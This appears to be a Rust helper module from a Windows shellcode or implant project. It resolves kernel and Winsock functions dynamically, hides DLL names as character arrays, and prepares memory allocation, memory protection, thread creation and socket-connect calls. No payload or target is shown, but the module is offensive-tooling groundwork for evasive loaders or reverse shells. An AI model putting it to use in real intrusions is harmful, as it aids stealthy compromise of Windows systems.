use core::{
    cell::LazyCell,
    ffi::{c_char, c_int, c_void},
};

use windows_sys::Win32::Networking::WinSock::{QOS, SOCKET, WSABUF, WSADATA, WSAPROTOCOL_INFOA};

use crate::{binds::*, resolve_func};

#[repr(transparent)]
struct CachedPtr<T, F = fn() -> T>(LazyCell<T, F>);
unsafe impl<T, F> Sync for CachedPtr<T, F> {}

impl<T, F: FnOnce() -> T> CachedPtr<T, F> {
    #[inline]
    pub const fn new(f: F) -> CachedPtr<T, F> {
        CachedPtr(LazyCell::new(f))
    }
}

pub const GetProcAddress_: &str = concat!("GetProcAddress", "\0");
pub const MessageBoxA_: &str = concat!("MessageBoxA", "\0");
pub const GlobalAlloc_: &str = concat!("GlobalAlloc", "\0");

pub type LoadLibraryAFn = unsafe extern "system" fn(lpFileName: *const u8) -> PVOID;
pub type GetProcAddressFn = unsafe extern "system" fn(hmodule: PVOID, name: *const u8) -> PVOID;
pub type MessageBoxAFn =
    unsafe extern "system" fn(h: PVOID, text: LPCSTR, cation: LPCSTR, t: u32) -> u32;
pub type OutputDebugStringAFn = unsafe extern "C" fn(*const i8);
pub type DbgPrintFn = unsafe extern "C" fn(Format: *const u8, ...) -> NTSTATUS;
pub type GetModuleHandleAFn = unsafe extern "system" fn(lpModuleName: LPCSTR) -> PVOID;
pub type CreateFileAFn = unsafe extern "system" fn(
    lpFileName: LPCSTR,
    dwDesiredAccess: u32,
    dwShareMode: u32,
    lpSecurityAttributes: PVOID,
    dwCreationDisposition: u32,
    dwFlagsAndATtributes: u32,
    hTemplateFile: PVOID,
) -> PVOID;
pub type wsprintfaFn = unsafe extern "system" fn(outbuf: LPSTR, inbuf: LPCSTR, ...);
pub type ReadFileFn = unsafe extern "system" fn(
    hFile: PVOID,
    lpBuf: PVOID,
    nNumberOfBytesToRead: u32,
    lpNumberOfBytesRead: *mut u32,
    lpOverlapped: PVOID,
) -> c_int;
pub type GlobalAllocFn = unsafe extern "system" fn(flags: u32, byte_count: usize) -> PVOID;
pub type GlobalFreeFn = unsafe extern "system" fn(addr: PVOID);
pub type VirtualAllocFn = unsafe extern "system" fn(
    lpAddress: *const c_void,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> PVOID;
pub type VirtualFreeFn =
    unsafe extern "system" fn(lpAddress: PVOID, dwSize: usize, dwFreeType: u32) -> bool;

pub type VirtualProtectFn = unsafe extern "system" fn(
    lpAddress: *const c_void,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> c_char;
pub type GetFileSizeFn = unsafe extern "system" fn(hFile: PVOID, lpHighFileSize: *mut u32) -> u32;
pub type CreateThreadFn = unsafe extern "system" fn(
    lpThreadAttributes: *const c_void,
    dwStackSize: usize,
    lpStartAddress: *const c_void,
    lpParameter: *const c_void,
    dwCreationFlags: u32,
    lpThreadId: *mut u32,
) -> *mut c_void;

pub type RtlAddFunctionTableFn = unsafe extern "system" fn(
    FunctionTable: *const c_void,
    EntryCount: u32,
    BaseAddress: u64,
) -> u32;

pub type CloseHandleFn = unsafe extern "system" fn(hObject: PVOID);

pub type ExpandEnvironmentStringsAFn =
    unsafe extern "system" fn(lpSrc: *const u8, lpDst: *mut u8, size: u32) -> u32;

pub type GetFullPathNameAFn = unsafe extern "system" fn(
    lpFileName: *const u8,
    nBufferLength: u32,
    lpBuffer: *mut u8,
    lpFilePart: *mut *const u8,
) -> u32;

pub type WSAStartupFn = unsafe extern "system" fn(wVersionRequired: u16, lpsWSAData: *mut WSADATA);

pub type WSASocketAFn = unsafe extern "system" fn(
    af: c_int,
    typ: c_int,
    protocol: c_int,
    lpProtocolInfo: *const WSAPROTOCOL_INFOA,
    group: *const c_void, // we won't use, no need to bring in the feature for the appropriate type
    dwFlags: u32,
) -> SOCKET;

pub type WSAConnectFn = unsafe extern "system" fn(
    socket: SOCKET,
    sockaddr: *const c_char,
    namelen: c_int,
    lpCallerData: *const WSABUF,
    lpCalleeData: *mut WSABUF,
    lpSQOS: *const QOS,
    lpGQOS: *const QOS,
);

pub type WriteFileFn = unsafe extern "system" fn(
    hFile: PVOID,
    lpBuffer: *const c_void,
    nNumberOfBytesToWrite: u32,
    lpNumberOfBytesWritten: *mut u32,
    lpOverlapped: *mut c_void,
);

pub type GetLastErrorFn = unsafe extern "system" fn() -> u32;

pub type inet_addrFn = unsafe extern "system" fn(cp: *const c_char) -> u32;

// pub fn get_kernel32_test() -> PVOID {
//     static KERNEL32: CachedPtr<PVOID> = CachedPtr::new(|| {
//         let KERNEL32_STR: [u16; 13] = [75, 69, 82, 78, 69, 76, 51, 50, 46, 68, 76, 76, 0];
//         crate::get_module_by_name(KERNEL32_STR.as_ptr())
//     });

//     *KERNEL32.0
// }

pub fn get_kernelbase() -> Option<PVOID> {
    let KERNEL32_STR: [u16; 15] = [
        'K' as u16, 'E' as u16, 'R' as u16, 'N' as u16, 'E' as u16, 'L' as u16, 'B' as u16,
        'A' as u16, 'S' as u16, 'E' as u16, '.' as u16, 'D' as u16, 'L' as u16, 'L' as u16, 0,
    ];
    crate::get_module_by_name(KERNEL32_STR.as_ptr())
}

pub fn get_kernel32(kernelbase_ptr: PVOID) -> Option<PVOID> {
    let KERNEL32_STR: [u16; 13] = [
        'K' as u16, 'E' as u16, 'R' as u16, 'N' as u16, 'E' as u16, 'L' as u16, '3' as u16,
        '2' as u16, '.' as u16, 'D' as u16, 'L' as u16, 'L' as u16, 0,
    ];

    crate::get_module_by_name(KERNEL32_STR.as_ptr()).or_else(|| {
        let kernel32 = concat!("kernel32.dll", "\0");
        let kernel32_ptr =
            unsafe { (fetch_load_library(kernelbase_ptr))(kernel32.as_ptr() as *const _) };
        if kernel32_ptr.is_null() {
            None
        } else {
            Some(kernel32_ptr)
        }
    })
}

pub fn get_ws2_32(kernelbase_ptr: PVOID) -> Option<PVOID> {
    let WS2_32_WSTR: [u16; 11] = [
        'W' as u16, 'S' as u16, '2' as u16, '_' as u16, '3' as u16, '2' as u16, '.' as u16,
        'd' as u16, 'l' as u16, 'l' as u16, 0,
    ];

    crate::get_module_by_name(WS2_32_WSTR.as_ptr()).or_else(|| {
        let ws2_32_str = concat!("WS2_32.dll", "\0");
        let ws2_32_ptr =
            unsafe { (fetch_load_library(kernelbase_ptr))(ws2_32_str.as_ptr() as *const _) };
        if ws2_32_ptr.is_null() {
            None
        } else {
            Some(ws2_32_ptr)
        }
    })
}

pub fn get_user32(kernelbase_ptr: PVOID) -> PVOID {
    let user32 = concat!("user32.dll", "\0");
    let mut u32_ptr = unsafe { (fetch_load_library(kernelbase_ptr))(user32.as_ptr() as *const _) };
    if u32_ptr.is_null() {
        u32_ptr =
            unsafe { (fetch_get_module_handle(kernelbase_ptr))(user32.as_ptr() as *const i8) };
    }

    u32_ptr
}

pub fn fetch_get_last_error(kernelbase_ptr: PVOID) -> GetLastErrorFn {
    resolve_func!(kernelbase_ptr, "GetLastError")
}

pub fn fetch_wsa_startup(ws2_32_ptr: PVOID) -> WSAStartupFn {
    resolve_func!(ws2_32_ptr, "WSAStartup")
}

pub fn fetch_wsa_connect(ws2_32_ptr: PVOID) -> WSAConnectFn {
    resolve_func!(ws2_32_ptr, "WSAConnect")
}

pub fn fetch_wsa_socket(ws2_32_ptr: PVOID) -> WSASocketAFn {
    resolve_func!(ws2_32_ptr, "WSASocketA")
}

pub fn fetch_inet_addr(ws2_32_ptr: PVOID) -> inet_addrFn {
    resolve_func!(ws2_32_ptr, "inet_addr")
}

pub fn fetch_get_full_path_name(kernelbase_ptr: PVOID) -> GetFullPathNameAFn {
    resolve_func!(kernelbase_ptr, "GetFullPathNameA")
}

pub fn fetch_wsprintf(user32_ptr: PVOID) -> wsprintfaFn {
    resolve_func!(user32_ptr, "wsprintfA")
}

pub fn fetch_expand_environment_strings(kernelbase_ptr: PVOID) -> ExpandEnvironmentStringsAFn {
    resolve_func!(kernelbase_ptr, "ExpandEnvironmentStringsA")
}

pub fn fetch_rtl_add_fn_table(kernel32_ptr: PVOID) -> RtlAddFunctionTableFn {
    resolve_func!(kernel32_ptr, "RtlAddFunctionTable")
}

pub fn fetch_create_thread(kernelbase_ptr: PVOID) -> CreateThreadFn {
    resolve_func!(kernelbase_ptr, "CreateThread")
}

pub fn fetch_global_alloc(kernelbase_ptr: PVOID) -> GlobalAllocFn {
    resolve_func!(kernelbase_ptr, "GlobalAlloc")
}

pub fn fetch_global_free(kernelbase_ptr: PVOID) -> GlobalFreeFn {
    resolve_func!(kernelbase_ptr, "GlobalFree")
}

pub fn fetch_get_file_size(kernelbase_ptr: PVOID) -> GetFileSizeFn {
    resolve_func!(kernelbase_ptr, "GetFileSize")
}

pub fn fetch_output_debug_string(kernelbase_ptr: PVOID) -> OutputDebugStringAFn {
    resolve_func!(kernelbase_ptr, "OutputDebugStringA")
}

pub fn fetch_get_module_handle(kernelbase_ptr: PVOID) -> GetModuleHandleAFn {
    resolve_func!(kernelbase_ptr, "GetModuleHandleA")
}

pub fn fetch_get_proc_address(kernelbase_ptr: PVOID) -> GetProcAddressFn {
    resolve_func!(kernelbase_ptr, "GetProcAddress")
}

pub fn fetch_load_library(kernelbase_ptr: PVOID) -> LoadLibraryAFn {
    resolve_func!(kernelbase_ptr, "LoadLibraryA")
}

pub fn fetch_create_file(kernelbase_ptr: PVOID) -> CreateFileAFn {
    resolve_func!(kernelbase_ptr, "CreateFileA")
}

pub fn fetch_write_file(kernelbase_ptr: PVOID) -> WriteFileFn {
    resolve_func!(kernelbase_ptr, "WriteFile")
}

pub fn fetch_read_file(kernelbase_ptr: PVOID) -> ReadFileFn {
    resolve_func!(kernelbase_ptr, "ReadFile")
}

pub fn fetch_virtual_alloc(kernelbase_ptr: PVOID) -> VirtualAllocFn {
    resolve_func!(kernelbase_ptr, "VirtualAlloc")
}

pub fn fetch_virtual_free(kernelbase_ptr: PVOID) -> VirtualFreeFn {
    resolve_func!(kernelbase_ptr, "VirtualFree")
}

pub fn fetch_virtual_protect(kernelbase_ptr: PVOID) -> VirtualProtectFn {
    resolve_func!(kernelbase_ptr, "VirtualProtect")
}

pub fn fetch_close_handle(kernelbase_ptr: PVOID) -> CloseHandleFn {
    resolve_func!(kernelbase_ptr, "CloseHandle")
}
